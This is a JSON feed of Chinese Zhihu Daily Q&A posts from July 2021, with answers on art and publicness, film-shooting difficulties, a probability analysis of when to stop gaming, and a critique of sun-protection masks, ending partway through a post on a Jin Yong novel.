[{"title":"不具有公共性的艺术还算艺术吗？","date":"2021-07-01 23:07:05","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>爱因斯坦的斯坦。。。</span>\n<a href=\"https://www.zhihu.com/question/465384478/answer/1959603792\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这个问题其实是包含了好多问题。。。一个是艺术是不是需要强烈的个人风格，一个是可不可以不考虑公共性，一个是个人的艺术是不是产生于灵感的。</p>\n<p><strong>艺术并不那么个人</strong></p>\n<p>先说一下前者，现在有一个广为人们所接受的想法，就是艺术是一个很个人的东西，甚至是私人的东西。这大约和学院派式微，印象派的崛起和个人风格越来越受重视有关。但如果你放眼艺术史，会发现其实艺术在绝大部分时候，都是一个非常公共性的东西。</p>\n<p>比如古代西方，不用说，我们现在所谓的艺术家在那个时候都是工匠，雕塑和绘画上连名字都是没有的。这个情况大概一直延续到文艺复兴。更不用提古代艺术家的创作更是完全公共的作品，教堂的壁画，雕塑，古希腊的神像，都是服务于公共空间的。文艺复兴之后，服务于金主，公共性少了点，个人性大约是多了点，但也是有限得很。大概马上有人会说了，卡拉瓦乔，伦勃朗，都是很个人的艺术家，没错，但问题是他们可都是创造出新风格的人物啊，看看同时期其他艺术家，都是比较同质化的。我们学艺术史，都是节点式学习，就学那个跳变的一个点，导致我们脑子里的艺术史都是这一个个的闪光点，其实历史上 99.99%的艺术，都是在同质化的基础上有那么一点点个人的东西，我们眼睛里只看到了那 0.01%。相当于只有骨架，没有肉。直到印象派，艺术的主旋律，还是同质化的，不那么个人的。</p>\n<p>中国比较特殊一点，宋代以后，文人画开始流行，绘画变得个人起来了。文人画画，号称都是笔墨游戏，但这个个人只是创作心态上而言的，谈到笔墨技法，又是同质化。当然也有不少风格独特的艺术家，但还是那句话，那是 0.01%。。。至少在中国书画这个领域，你可能学这个学那个，你有你自己的路子，但那也是老路，不强调个人独创的风格。</p>\n<p>可以说在古代，公共性不说有多强吧，至少个人风格并不被鼓励。</p>\n<p>直到现代，忽然之间，艺术风格才得到了重视。每个人都在探索个人的风格，没有个人风格，大概就属于无聊的画匠了。到了当代，又没有人重视风格了，因为当代艺术范围之广，突出形式的艺术家越来越少了，可能还有草间弥生，杰夫昆斯之类具有鲜明形式特点的艺术家，但这只是无数当代艺术中的一小类罢了。</p>\n<p><strong>当代艺术的公共性</strong></p>\n<p>如果说形式和风格已经不是重点了，那么对于当代那什么是重点？你可以回忆一下，观看当代艺术展览，你看的是什么？你是不是在那疯狂猜，疯狂脑洞他到底是什么意思？</p>\n<p>所以啊当代艺术理念是最重要的，他的最终目的，是让你思考，并且思考个爽。为什么思考当代艺术会爽到？不是他风格多么独特，也不是他有多么好看，而是他表达背后理念的方式和过程，有能挠到你痒处的地方，有能戳到你小心心的地方。最终，这是一个理念的游戏。</p>\n<p>在以前，注重形式的艺术，只需要关注形式，人人都长了眼睛，好看的东西，大家都能看出来。但现在呢，理念就不是那么普适的东西了，每个观众的生活经历，知识，文化背景差别都巨大，对牛弹琴是常有的事情。公共性就体现在这里了，艺术品想要谈的东西，必须得考虑观众的接受问题。谈一个超级冷门的问题，没人知道，等于对着空气使力，所以得谈一个公共问题，批不批判先不说吧，也有走温暖路线的，不是说必须得批判。但讨论的问题如果太个人，别人得不到，等于不考虑观众了，也就是说有没有人看无所谓。我是严重怀疑这一点，哪怕梵高，这么自嗨的艺术，也是渴望观众的。或者说你仍然走纯形式路线？那这就过时了，老师大概是不会希望这样的，形式化的艺术路都被前人走尽了。</p>\n<p><strong>艺术灵感</strong></p>\n<p>最后一个问题就是所谓“灵感”不是持续的东西。灵感当然是有的，也是一瞬的，但把灵感变成艺术品，是一个需要极大耐心的，持续性思考的过程。</p>\n<p>如果看下面这个康定斯基画画的视频，你是不是觉得这是灵感喷薄而出的产物？好像也是没什么理由的？</p>\n<p>但其实不是的，这是康定斯基“唯手熟尔”的结果。他绘画一整套理论，慢慢形成《点线面》这本书，详细到你照着操作就能画出满满地都是康定斯基味的画来。这是长时间持续思考的结果，里面当然也汇聚了康定斯基无数个灵感的瞬间。但最终呈现出来的，就是视频这个样子，几乎不需要多加思考。</p>\n<p>包括梵高也是一样的，别看他画的好像很潇洒，其实都是他画废很多张之后出来的东西了。比如向日葵，据他的日记说，画了很多都不满意，反复雕琢，才出来他认为好的几张向日葵。</p>\n<p>当代艺术的很多“idea”，也是一样的。瞬间的灵感只是一个种子，要让这颗种子长大开花，成为最后的艺术品，需要细心的培育。同时因为当代艺术是一个理念的游戏，你就得对理念进行深入的思考，这是支撑起作品的内核，否则就只剩下一个形式的空壳，而形式对于当代艺术等于什么都没有。</p>\n<p>也有一些当代艺术作品是没经过仔细思考，就“看起来很当代”的那种，作者可能也没仔细想过。但这些一般都不是好的作品，或许偶尔瞎猫碰少死耗子出来一些好的，那也是随机事件罢了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/465384478\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737657"},{"title":"为什么小孩、 动物和水是电影界三大最难拍摄的元素?","date":"2021-07-01 23:07:01","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-5ed3d62480d72a1fa1ade4a111070aa6_l.jpg?source=8673f162\"><span>sydneyhugh，</span><span>会跳高的父亲，理性的白痴</span>\n<a href=\"https://www.zhihu.com/question/20625452/answer/1966355741\" hidden>阅读原文</a>\n</div>\n<div>\n<p>电影拍摄时的难度是可预见性。</p>\n<p>为什么是可预见性，另外组成可预见性有那些不可预见的因素影响。</p>\n<p>因为商业电影拍摄无论数字还是胶片大约在是一个 35mm 到 70mm 的胶片或感光元器件上记录下来拍摄的现场信息，拍摄完经历一系列处理最后与观众见面的是大屏幕。放大很多，所有的缺陷都会放大。</p>\n<p>另外电影是剪接的艺术，每次拍摄一段，然后进行拼接和剪接完成最后的整部电影，那么它们在成片前不同机位，机器不同时间拍摄的内容需要精密的控制技术参数便于无缝的再组合。不然一个正反打观众就觉得不一个环境，那就车祸出戏了（这就举个最最简单的小例子）。</p>\n<p>所以电影要求拍摄时的范围尽量变小，做减法，小到影响拍摄的可能性降至最低。所以拍摄范围也相对减小。</p>\n<p>电影演员除了表演外，最大的要求是自己的位置感，就是你被拍摄时，你与对应环境与人以及摄影机的位置关系。不然导演就要忙乎，让你在你的位置表演。这样看，孩子和动物对于这种所谓的位置感是很陌生的，有很多专业演员都做的不一定好（说个笑话，电影学院培养的演员一般位置感好，戏剧学院培养的演员则台词好，但动作过大，过于夸张，微表情差）。那么当然导演，摄影，灯光一大堆人就一通忙乎，重拍率就大大提高。</p>\n<p>我自己经历过多次拍摄动物，比如 speedo 的全球投放广告索普与海狮还是胶片时代，120 秒，我勒个去拍了一个月。海狮一会太配合，一会不配合，萌萌哒，气得你笑出来。国内拍七匹狼广告，狼是美国搞过来从小狼崽养起来的，拍完了都说再也不给自己惹这种麻烦了。因为要狼们按一个阵形跑，那简直就是用肉啊。吃多了不干活，吃少了乱动，四个机位最后拍摄周期太长直接上 6 机位了都。</p>\n<p>小孩。小孩的问题是过度表演。影像要求的自然，孩子一上场听到导演说开始，就如同打了鸡血一样的满脸诗朗诵的表情。结果呢？让表演回归自然等于上了一个月表演培训课。</p>\n<p>水。水的问题是各种反光，衍射，当连贯影像出来后一致性差。主要是不同条的一致性差。另外棚拍时候自然模拟的参数和感觉需要大量实验参数积累和模拟。难度在接触面的感觉。比如自然情况下下去 4-5 点的黄金拍摄期阳光，海与船体，岸边，以及船上人与物品的自然光反射模拟情况复杂。很多时候模拟可以完成，但自然特点不够理想。比如拍《甲午海战》，不同水质对于不同材质和重量的反应不同，结果呢？其实很车祸。</p>\n<p>国外有一些专门的小公司做动力试验，参数完整，拍摄时会外包购买。但不便宜。比如拍《太平洋战争》的制片，特指和摄指，其实出生都是原本部队的技术人员，退役军官。</p>\n<p>这一堆加在一起比如老虎，船，海，小孩，棚内，外景，前期参数与后期参数匹配，影像对位资料都加一起。是不是要吐血？</p>\n<p>当然没有什么不是一闭眼就能过的。关键还要看要求和标准了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/20625452\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737645"},{"title":"从概率学上看，输一把睡觉vs赢一把睡觉，哪个胜率更高一些？","date":"2021-07-01 23:06:51","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/5cb0236fb_l.jpg?source=8673f162\"><span>王小龙，</span><span>陕师大数统院讲师</span>\n<a href=\"https://www.zhihu.com/question/461910176/answer/1955208355\" hidden>阅读原文</a>\n</div>\n<div>\n<p>一个好好的数学问题为啥没人正经答题呢？</p>\n<p><strong>先说结论：两种策略的赢率是一样的，但是赢率的波动性大小不同。</strong></p>\n<p>假设你叫小明，玩一把游戏的获胜概率是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p\" alt=\"\"></p>\n<p>，输的概率是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=q%3D1-p\" alt=\"\"></p>\n<p>，各局游戏相互独立，有两种游戏策略：输了就睡觉和赢了就睡觉。这就带来几个问题：</p>\n<ol>\n<li><strong>什么时候能睡觉？</strong></li>\n<li><strong>胜率如何？</strong></li>\n<li><strong>如何稳赢？</strong></li>\n</ol>\n<p>为了分析这些问题，定义随机变量</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=X\" alt=\"\"></p>\n<p>和</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=Y\" alt=\"\"></p>\n<p>分别为采取\"输了就睡觉\"和\"赢了就睡觉\"策略玩游戏的总局数，那么由独立性条件可以得到概率：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=P%5C%7BX%3Dk%5C%7D%3Dp%5E%7Bk-1%7Dq%2Ck%3D1%2C2%2C3%2C%5Ccdots\" alt=\"\"></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=P%5C%7BY%3Dk%5C%7D%3Dq%5E%7Bk-1%7Dp%2Ck%3D1%2C2%2C3%2C%5Ccdots\" alt=\"\"></p>\n<p>即前</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k-1\" alt=\"\"></p>\n<p>局连赢(输)，第</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"\"></p>\n<p>局游戏第一次输(赢)的概率，这个分布称为几何分布。注意这两个分布具有对称性(把</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p\" alt=\"\"></p>\n<p>和</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=q\" alt=\"\"></p>\n<p>对调，问题只是换了一种陈述）。</p>\n<p><strong>问题 1：什么时候能睡觉？</strong></p>\n<p>计算游戏局数的期望：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctext%7BE%7DX%3D1%5Ccdot+q+%2B+2%5Ccdot+pq+%2B+3%5Ccdot+p%5E2q%2B%5Ccdots%3D1%2Fq\" alt=\"\"></p>\n<p>类似地，由对称性：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctext%7BE%7DY%3D1%2Fp\" alt=\"\"></p>\n<p>因此</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctext%7BE%7DX%3C%5Ctext%7BE%7DY\" alt=\"\"></p>\n<p>等价于</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3Cq\" alt=\"\"></p>\n<p>，也就是说，如果小明的胜率</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3C0.5\" alt=\"\"></p>\n<p>，\"输一把睡觉\"能够更快地睡上觉。如果小明很菜，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%5Capprox0\" alt=\"\"></p>\n<p>，采用输一把睡觉的平均游戏局数为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctext%7BE%7DX%3D1%2Fq%3D1%2F%281-p%29%5Capprox1\" alt=\"\"></p>\n<p>也就是基本上玩一局就能睡觉啦。反之，如果小明错误的采用\"赢一把睡觉\"的策略，那么他平均需要玩</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctext%7BE%7DY%3D1%2Fp%5Crightarrow%5Cinfty\" alt=\"\"></p>\n<p>，因此对于菜鸡来说，<strong>赢一把就睡策略的潜台词是我要通宵</strong>。</p>\n<p><strong>问题 2：胜率如何？</strong></p>\n<p>如果采取\"输了就睡觉\"策略反复玩游戏</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=n\" alt=\"\"></p>\n<p>天，每天一共玩</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=X_i%28i%3D1%2C2%2C%5Ccdots%2Cn%29\" alt=\"\"></p>\n<p>局，其中赢</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=X_i-1\" alt=\"\"></p>\n<p>局，输</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=1\" alt=\"\"></p>\n<p>局，那么总共赢了</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Csum_%7Bi%3D1%7D%5En%28X_i-1%29\" alt=\"\"></p>\n<p>局，输了</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=n\" alt=\"\"></p>\n<p>局，赢率为：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=r_X%3D%5Cfrac%7B%5Csum_%7Bi%3D1%7D%5En%28X_i-1%29%7D%7B%5Csum_%7Bi%3D1%7D%5EnX_i%7D%3D%5Cfrac%7B%5Csum_%7Bi%3D1%7D%5EnX_i-n%7D%7B%5Csum_%7Bi%3D1%7D%5EnX_i%7D%3D1-%5Cfrac%7Bn%7D%7B%5Csum_%7Bi%3D1%7D%5EnX_i%7D%5C%5C+%3D1-%5Cfrac%7B1%7D%7B%5Cfrac%7B1%7D%7Bn%7D%5Csum_%7Bi%3D1%7D%5EnX_i%7D%5Capprox+1-%5Cfrac%7B1%7D%7B%5Ctext%7BE%7DX%7D%3D1-%5Cfrac%7B1%7D%7B1%2Fq%7D%3Dp\" alt=\"\"></p>\n<p>其中我们用到了大数定律，大量样本的平均值趋向于期望</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7B1%7D%7Bn%7D%5Csum_%7Bi%3D1%7D%5EnX_i%5Capprox+%5Ctext%7BE%7DX\" alt=\"\"></p>\n<p>如果采取\"赢了就睡觉\"策略反复玩游戏</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=n\" alt=\"\"></p>\n<p>天，每天一共玩</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=Y_i%28i%3D1%2C2%2C%5Ccdots%2Cn%29\" alt=\"\"></p>\n<p>局，赢</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=1\" alt=\"\"></p>\n<p>局，那么总共赢了</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Csum_%7Bi%3D1%7D%5En+1%3Dn\" alt=\"\"></p>\n<p>局，赢率为：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=r_Y%3D%5Cfrac%7Bn%7D%7B%5Csum_%7Bi%3D1%7D%5EnY_i%7D%3D%5Cfrac%7B1%7D%7B%5Cfrac%7B1%7D%7Bn%7D%5Csum_%7Bi%3D1%7D%5EnY_i%7D%5Capprox+%5Cfrac%7B1%7D%7B%5Cfrac%7B1%7D%7Bp%7D%7D%3Dp\" alt=\"\"></p>\n<p>因此如果每天采取同样的策略玩游戏，长此以往，<strong>两种策略的赢率是一样的</strong>，都是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p\" alt=\"\"></p>\n<p>。这类似于如果所有人都采用一直生娃，直到生出男(女)娃停止的生育策略，那么男女比率还是 1:1。</p>\n<p><strong>问题 3：如何稳赢？</strong></p>\n<p>现在小明有了三种游戏策略：a.只玩一把就睡觉，b.输一把就睡觉，c.赢一把就睡觉，上面我们推导出这三种策略的胜率都是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p\" alt=\"\"></p>\n<p>。但是在现实生活中，这三种策略的实际胜率具有随机性，其波动大小并不一样。这就好比你有三种股票可以选择投资，它们的平均回报率可能都是 5%，但其波动性不同：第一种股票稳赚 5%，第二种股票可能赚 1%-%9，第三种股票可能赚 15%，也可能亏 5%，只是平均而言赚 5%。小明的人生只有一次，因此当他选择投资方式时，应该选择波动性较小或者风险较低的投资方式，甚至为较小的风险、牺牲一定回报率也是值得的。这也是为什么国债虽然利率低，但总是很抢手，因为风险极低。</p>\n<p>我们可以用胜率的标准差来衡量其波动性，假设小明是高玩(</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3D0.9\" alt=\"\"></p>\n<p>)，下图种展示了小明采取三种策略的胜率的均值和标准差，可以看到随着游戏天数增加，三种策略的平均胜率很快趋向于 0.9，但\"输一把就睡\"的 error bar 更窄，说明<strong>胜得更稳</strong>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4d4460075dc06a706c8f4d7b8efb7c81_720w.jpg?source=8673f162\" alt=\"\"></figure><p>相反，下图表明如果小明是菜鸡(</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3D0.1\" alt=\"\"></p>\n<p>)，采取赢一把就睡的策略，不仅能够爽玩，赢率也更稳定。如果小明的目标是提高胜率，那么采取输一把就睡策略，胜率的波动性更大，更有可能高到 0.15 以上，但也有较大可能低到 0.05 以下，如果小明兼有赌狗属性，也许会<strong>不理智地</strong>选择这种<strong>高风险策略</strong>。对于理性人来说，当平均收益(胜率)相同时，总是应该选择低风险的策略。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-2055b33880f3c97c98f755913eeea8bd_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>总结：</strong></p>\n<p>两种策略的赢率是一样的，对于高玩(</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3E0.5\" alt=\"\"></p>\n<p>)采取赢了就睡觉策略能更快睡上觉，但赢率波动性较大，反之对于菜鸡(</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3C0.5\" alt=\"\"></p>\n<p>)，采用赢了就睡觉策略更难睡上觉。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/461910176\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737644"},{"title":"防晒口罩和普通口罩的区别在哪？是智商税吗？","date":"2021-07-01 23:06:43","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-fb32fc943a6c867ea8c765c646a56b8f_l.jpg?source=8673f162\"><span>姚蔚铭，</span><span>纺织品化学工程师（神秘职业） 纺织品问题请付费咨询</span>\n<a href=\"https://www.zhihu.com/question/369210379/answer/1966467088\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>先说结论：</strong>防晒口罩就是智商税，并且<strong>还要额外收点生命税</strong></p>\n<p>如果你想弄明白<strong>防晒口罩</strong>，<strong>那你一定要找我</strong>，因为只有我（姚蔚铭 <strong>纺织品化学工程师</strong>）才能给你讲明白。</p>\n<p>凡是大肆<strong>假科普真带货</strong>的文章，都会只和你提防晒口罩的防晒效果（UPF 值）,如果你知道防晒口罩是如何生产制造出防晒效果的，那你可能再也不愿意用了。</p>\n<blockquote>插一句，<strong>防晒伞也是智商税</strong>“<a href=\"https://www.zhihu.com/question/268862323/answer/1963048963\">遮阳伞有必要买很贵的吗？</a>”<strong>但防晒衣不是智商税</strong>“<a href=\"https://www.zhihu.com/question/398086368/answer/1956472996\">防晒衣是不是智商税？</a>”，它们的防晒出发点并不一样。</blockquote>\n<hr>\n<p><strong>1.盲目追求 UPF 数值 毫无意义！</strong></p>\n<p>正常的防晒功能根本不需要去实现，普通的<strong>几毛钱的一次性口罩就有足够的防晒效果了</strong>。如果没有，那他们的脸是如何晒成这样的？</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-9f617b6b97e5bf810ab844c64e1b8f60_720w.jpg?source=8673f162\" alt=\"\"></figure><p>许多商家都在标榜自己的产品高 UPF 值，但根本不给你解释清楚什么是 UPF 值。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5303211a178bc5921e66a353404d9e86_720w.jpg?source=8673f162\" alt=\"\"></figure><p>其实这串八股文换成人话讲就是</p>\n<blockquote>\n<strong>50 UPF=</strong>只有<strong>50 分之 1</strong>的紫外线可以通过<br><strong>30 UPF=</strong>只有<strong>30 分之 1</strong>的紫外线可以通过<br>..........以此类推</blockquote>\n<p>假科普真带货的文章，只会一味告诉你购买 高 UPF 值 的防晒口罩，其实<strong>高 UPF 值毫无意义</strong>。</p>\n<p><strong>哪怕 UPF 只有可怜的 15</strong>（普通口罩水平）<strong>，也能阻挡 93.3%的紫外线。</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-9392ab74f097206934bdf4c0884b6c66_720w.jpg?source=8673f162\" alt=\"\"><figcaption>因为我真的有设备直接测试（普通医用口罩）</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-8ca48da82cee29c0e6e15415c94c924c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>看似防晒口罩 UPF 50 和 30 差距很大，其实 UPF 50 换算过来就是紫外线穿透 2.0%，UPF 30 等于紫外线穿透 3.3%。</p>\n<p>差距根本不大，良心的讲，<strong>盲目追求 UPF 数值毫无意义</strong>。</p>\n<blockquote>UPF 值详细分析参考这篇<a href=\"https://www.zhihu.com/question/398086368/answer/1956472996?utm_source=zhihu&amp;utm_medium=social&amp;utm_oi=613892982542438400\">防晒衣是不是智商税？</a>\n</blockquote>\n<p><strong>2.高防晒值的口罩是如何制作的？</strong></p>\n<p>前面讲了，普通的口罩足以提供良好的防晒效果（日常出勤完全完全完全足够），但是<strong>“通过防晒产品的认证”</strong>要求是很严格的。</p>\n<p>要达到 <strong>UVA 透射率小于 5%，UPF 值大于 40</strong></p>\n<p>因为中国防晒产品的标准基于最严格的欧州标准，像澳洲、新西兰、美国的抗紫外标准都是以 UPF 15 就足够了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0c91f42331e1c7827fa28be60db86869_720w.jpg?source=8673f162\" alt=\"\"></figure><p>为了通过这么严格的防紫外产品认证，单靠面料本身已经远远不够。</p>\n<p>所以就要<strong>在口罩上加料</strong></p>\n<p>加的就是<strong>三嗪类的紫外吸收剂</strong>，依靠分子结构中<strong>酮式</strong>与<strong>烯醇式</strong>的转换 ,把吸收的光能转换成热能</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f647684ef96623fde8c7b5c363e75fb7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>又是学术定义式的八股文，就不深入讲了，总之一句话，<strong>只有这东西加的多了</strong>，防护紫外线的能力才能好，UPF 值才能达到 40 以上。</p>\n<p>不过大家好不好奇，<strong>三嗪类的化学物质到底是啥？</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-cb6533ba6ab502aefa9288ce3c37924e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>其实三嗪这个东西一听上去很陌生，那我提一下它的兄弟，就是加在三鹿奶粉里大名鼎鼎（臭名远扬）的<strong>三聚氰胺</strong>大家是不是就不陌生了。</p>\n<p>这种三嗪类的抗紫外剂<strong>加在衣服上是没有事情的，放心。</strong>因为它不会渗入皮肤也不会刺激皮肤。</p>\n<p>但是口罩就不一样了，经常和嘴唇接触并且潮湿，还有唾液的影响。上面的抗紫外剂在这种情况下是不牢固的，<strong>吃进去多少就看你嘴唇干不干了</strong>。</p>\n<p>要不是三鹿倒闭了，现在三鹿出防晒系列一定热卖。广告语就叫：“三鹿牌防晒口罩，纵享牛奶般的丝滑”</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-474b2470cfbf70d58b64356b700b6606_720w.jpg?source=8673f162\" alt=\"\"></figure><p>所以在纺织品基本安全规范标准中，针对婴幼儿纺织品（A 类纺织品）会添加<strong>耐唾液色牢度</strong>这个检测项目</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9a6b9e198e53bf66dac3e228280397bc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>因为婴儿的嘴部会经常接触面料，有潜在健康危害。所以如果你买防晒口罩，尽量买安全技术类别为 A 类的防晒口罩和 73049-2014 《针织口罩》标准认证。</p>\n<p>劝大家买各种纺织品前，先学会看吊牌。</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/368895160\">买衣服 | 如何看懂衣服吊牌</a></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7c44fe4c3180b0469c6169a77ad25981_720w.jpg?source=8673f162\" alt=\"\"><figcaption>没有防晒口罩专门的生产标准</figcaption></figure><p>因为没有防晒口罩专门生产标准，所以即便要购买，<strong>也要挑有上述标准认证的</strong>（GB/T 32610-2016 或者<strong>FZ/T 73049-2014</strong>）；<strong>GB/T 18830-2009</strong>《纺织品防紫外线性能的评定》这个标准是检测防紫外性能标准，普通消费者看他根本没用。</p>\n<p>所以我作为<strong>面料供应商的上游</strong>（纺织品化学工程师），我会选防晒口罩吗？</p>\n<p><strong>根本就不会买，一次性口罩足以。</strong>（开始断人财路了，求保护）</p>\n<p><strong>不过还有一种不加抗紫外剂的</strong>，这种一般都是在<strong>涤纶纺丝过程中加入二氧化钛的消光丝</strong>，其中的二氧化钛可以很好的反射紫外线。所以这种防晒效果不错，也更安全，只是略差于抗紫外剂。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-68bd6cd1a89563a14526b057aba16832_720w.jpg?source=8673f162\" alt=\"\"><figcaption>这个光学纤维什么鬼？？？</figcaption></figure><p>如果硬要买防晒口罩，挑这种原纱防晒的。优点是安全，缺点就是闷热。</p>\n<p>为了避免闷热，就<strong>又要引入冰感口罩概念</strong>。</p>\n<p><strong>3.冰感口罩是什么？</strong></p>\n<p>其实冰感口罩实现的方法有很多，普遍采用的是两种方式，一种是在<strong>纺丝过程中添加云母片</strong>，提高导热系数；另一种是<strong>加大量的硅油</strong>，提升导热系数从而带来冰感。</p>\n<p>其实普遍采用加大量硅油的形式，这种不仅凉感明显，而且<strong>手感巨软滑</strong>，消费之一戴都以为是很好的面料做的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8e014be27a96eb42bba3d3917ae6e6b3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不过好在硅油的直接毒性是小于抗紫外剂的，一般都是一些 D4、D5、D6 环体之类的残留，对人的影响应该、或许、可能、大约、不算太大。</p>\n<p>慢性过程，发现也是十几年后的事情了</p>\n<p>有的冰感口罩会在宣传页列出 Q-MAX 值检测报告，其实毛用没有，这个检测标准其实就有点问题，经常发现 Q-MAX 数值很漂亮，但冰感并不明显。<strong>加硅油才是王道</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ac7a341d3910bf40959d5db63c45cd94_720w.jpg?source=8673f162\" alt=\"\"><figcaption>就是这种粘稠的油液体</figcaption></figure><p><strong>4.吸湿速干怎么做的？</strong></p>\n<p>有的防晒口罩不是会加这种吸湿速干的宣传页么，<strong>它是如何实现的？</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b6fb839a22aa101d3bb7ba2f278d81fc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个其实有两种实现方式，不过一般是两种结合在一起用</p>\n<p>一种是纤维纺丝时采用<strong>异形纺丝</strong>的方式，汗液沿着纤维沟槽流动。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-04174c10cb0b435b8b1580468a761384_720w.jpg?source=8673f162\" alt=\"\"></figure><p>另一种就是加<strong>聚酯聚醚类化学物质</strong>的吸湿排汗剂，明显提高面料吸湿性能</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-efe96c5efb5563a34729ffc4d729529e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>5.防晒口罩推荐（因为良心在，所以根本不推荐）</strong></p>\n<p>我就先不说防晒口罩<strong>不能过滤 pm2.5 更不能防新冠</strong>，这么多化学物质接触皮肤和接触嘴是完全不同的结果，如果真的想大面积阻挡脖子、颈部防晒，撑把伞足够了。</p>\n<p>防晒口罩对于日常通勤的人士毫无意义，所以根本不推荐。</p>\n<p>因为许多品牌这两年，一直<strong>利用消费者对纺织品防晒知识的不了解</strong>，发现了防晒系列产品的暴利，<strong>大肆渲染紫外线的危害和恐惧</strong>。</p>\n<blockquote>卖钙片的说：隔着玻璃晒太阳没用，因为玻璃会吸收 30%紫外线，影响钙吸收。<br>卖防晒产品的说：UPF 小于 40 的没用（阻挡了 96%紫外线）依然会被晒黑</blockquote>\n<p>一次性口罩生产要求又高，安全有保证，既防 PM2.5 又防新冠，并且防晒效果又足够。几毛钱一个，我是不会买防晒口罩（断人财路，求保护。。。）</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/104608841\">医用口罩是如何阻挡看不见的病毒的？</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/369210379\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737635"},{"title":"周芷若在荒岛上为什么不杀赵敏？","date":"2021-07-01 23:06:37","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-03d18a8dfec55f50158eec7dd2508a25_l.jpg?source=8673f162\"><span>宜柔，</span><span>有的人之所以宝贵，是因为他们像风，永不停歇，谁也留不住。</span>\n<a href=\"https://www.zhihu.com/question/457353518/answer/1944222028\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这种说法不对。周芷若不仅打算杀了赵敏，而且实施了杀人行为。你想想，把一个中了十香软筋散之毒且处于昏迷状态的人扔进海里，这种行为本身就包含了致人死亡的高度盖然性。只不过赵敏运气太好了没有死，这不叫不杀赵敏，而是“欲达目的而不能”，周芷若构成故意杀人罪（未遂）。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-1e5444cb91ac59a64d40149a0fb1073c_720w.jpg?source=8673f162\" 